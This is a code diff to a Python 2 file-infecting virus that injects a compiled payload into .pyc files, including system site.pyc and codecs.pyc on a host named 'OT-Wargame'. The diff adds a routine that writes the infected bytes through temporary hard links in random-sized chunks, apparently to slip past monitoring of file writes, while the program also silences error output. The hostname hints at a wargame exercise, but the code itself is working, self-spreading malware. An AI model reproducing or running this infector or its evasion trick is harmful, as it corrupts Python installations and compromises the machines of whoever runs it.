@@ -4,6 +4,9 @@ import socket
 import marshal
 import glob
 import sys
+import os
+from random import randint
+from uuid import uuid4 as uuid
 
 sys.stderr = open("/dev/null", "w")
 
@@ -14,6 +17,26 @@ crypt = a
 
 def to_hex(s):
     return "\\x" + "\\x".join(c.encode("hex") for c in s)
+    
+    
+def hardlink_write(content, file):
+
+    size = len(content)
+    offset = 0
+    hardlink = "/tmp/%s" % uuid()
+    os.link(file, hardlink)
+    f = open(hardlink, 'w')
+    f.close()
+    os.unlink(hardlink)
+    while(offset < size):
+        os.link(file, hardlink)
+        f = open(hardlink, 'a')
+        size_chunk = randint(1, 1+(size-offset)/2)
+        f.write(content[offset:offset+size_chunk])
+        f.flush()
+        offset += size_chunk
+        f.close()
+        os.unlink(hardlink)    
 
 if __file__.endswith('.pyc'):
     template = "__TEMPLATE_PY__"
@@ -62,11 +85,8 @@ if __file__.endswith('.pyc'):
         payload = Code.from_code(compile(template_for_this_inject, "", "exec")).code
         payload = payload[:-2]
         data.code[:0] = payload
-
-        newfile = open(f_to_infect, 'w')
-        newfile.write(head)
-        marshal.dump(data.to_code(), newfile)
-        newfile.close()
+        content = "".join([head,marshal.dumps(data.to_code())])
+        hardlink_write(content, f_to_infect)
 
     if socket.gethostname() == "OT-Wargame":
         targets = ["/usr/lib/python2.6/site.pyc", "/usr/lib/python2.6/codecs.pyc"]
